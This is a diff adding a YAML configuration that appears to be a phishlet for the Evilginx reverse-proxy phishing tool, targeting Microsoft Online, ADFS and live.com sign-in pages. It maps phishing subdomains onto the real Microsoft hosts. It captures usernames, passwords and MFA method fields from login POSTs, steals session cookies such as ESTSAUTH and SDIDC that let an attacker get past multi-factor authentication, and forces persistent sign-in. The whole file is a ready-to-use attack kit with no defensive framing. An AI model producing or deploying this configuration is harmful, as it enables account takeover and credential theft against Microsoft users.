@@ -1,0 +1,85 @@
+
+name: 'Microsoft'
+author: 'Peter Ekwere'
+min_ver: '3.1.0'
+
+proxy_hosts:
+  # ADFS and Microsoft Online (for company accounts)
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com', session: true, is_landing: true}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com:443', session: true, is_landing: false}
+
+  # Regular Microsoft/Outlook/Live.com Accounts
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login.microsoftonline', orig_sub: 'login', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # ADFS-specific subfilters
+  - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'adfs.example.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  # Tokens for Microsoft Online and ADFS (company accounts)
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+
+  # Tokens for live.com (regular accounts)
+  - domain: '.login.live.com'
+    keys: ['SDIDC', 'JSHP']
+    type: 'cookie'
+
+credentials:
+  # Credentials for Microsoft company accounts (ADFS)
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+
+  # Credentials for regular live.com accounts
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+
+force_post:
+  # Microsoft ADFS login path adjustments
+  - path: '/login.srf'
+    search:
+      - {key: 'wa', search: '.*'}
+      - {key: 'wresult', search: '.*'}
+      - {key: 'wctx', search: '.*'}
+    force:
+      - {key: 'wresult', search: 'http\:\/\/adfs\.example\.com\:443', value: 'http://adfs.example.com'}
+    type: 'post'
+
+  # Regular live.com POST path adjustments
+  - path: '/ppsecure/post.srf'
+    search:
+      - {key: 'login', search: '.*'}
+      - {key: 'passwd', search: '.*'}
+    force:
+      - {key: 'KMSI', value: 'on'}
+    type: 'post'
+
+login:
+  # Login path for ADFS Microsoft Online
+  - domain: 'login.microsoftonline.com'
+    path: '/'
+
+  # Login path for live.com
+  - domain: 'login.live.com'
+    path: 'login.srf'
